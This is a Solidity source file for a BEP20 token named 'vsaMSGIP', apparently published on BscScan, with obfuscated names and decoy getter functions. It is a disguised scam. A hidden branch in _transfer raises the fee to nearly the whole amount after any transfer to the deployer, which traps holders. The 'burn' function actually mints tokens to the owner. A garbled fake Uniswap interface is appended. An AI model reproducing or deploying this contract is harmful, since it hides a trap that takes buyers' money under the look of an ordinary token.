/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
contract vsaMSGIP {
uint256 private  HvcxYA = 10000000000;
uint256 private  CSuAIh = 1000000000000000000;
uint256 public constant XrYXvv = 99999;
address private  EKfjkU = address(0);
address private  bDvyNH = address(0);
address private  gxCXCD = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  IVOYCs = 1000000000000000000;
address private  luXlWM = address(0);
address private  oOCLxG = address(0);
uint256 private  IFrNJq = 100000000;
uint256 private  XLDiul = 1000000000000000;
mapping (address => uint256) public balanceOf;
address private  dDfLXK = address(0);
string public  name = "vsaMSGIP";
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
string public  symbol = "vsaMSGIP";
uint256 private  JSMUAA = 10000000000000;
address private  IPShHh = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  LETiaz = address(0);
uint256 private  hoRpsL = 1000000000000000000000;
uint8 public constant decimals = 18;
address private  MvrsKx = address(0);
mapping (address => mapping (address => uint256)) private _allowances;




function _getluXlWM() private returns (address) {
return luXlWM;
}



function _getEKfjkU() private returns (address) {
return EKfjkU;
}



function _getIFrNJq() private returns (uint256) {
return IFrNJq;
}





function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PWVWuJ");
require(to != address(0), "PWVWuJ");
require(amount <= balanceOf[from], "PWVWuJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XrYXvv/CSuAIh ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MvrsKx){
CSuAIh = XrYXvv+2;
}
emit Transfer(from, to, transferAmount);
}
function _getIPShHh() private returns (address) {
return IPShHh;
}

function _gethoRpsL() private returns (uint256) {
return hoRpsL;
}

function _getHvcxYA() private returns (uint256) {
return HvcxYA;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
MvrsKx = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getoOCLxG() private returns (address) {
return oOCLxG;
}



function _getLETiaz() private returns (address) {
return LETiaz;
}

function _getbDvyNH() private returns (address) {
return bDvyNH;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getXLDiul() private returns (uint256) {
return XLDiul;
}

function _getJSMUAA() private returns (uint256) {
return JSMUAA;
}









function _getIVOYCs() private returns (uint256) {
return IVOYCs;
}



function _getdDfLXK() private returns (address) {
return dDfLXK;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPWVWuJ 0");
require(spender != address(0), "fPWVWuJ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getgxCXCD() private returns (address) {
return gxCXCD;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}
/*
IUniswapV2Factorydsd for the transfer amount
*/

interface IUniswapV2Factorydsd {
    event PairCreatedewq(address indexed token0, address indexed token1, address pair, uint);
    function fundToeqew() external view returns (address);
    function fundToaddsdfd() external view returns (address);
    function getdsfsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfgirs(uint) external view returns (address pair);
    function allPairjhgsLength() external view returns (uint);
    function createhgfhPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkPTo(address) external;
    function setLPjlhToadd(address) external;
}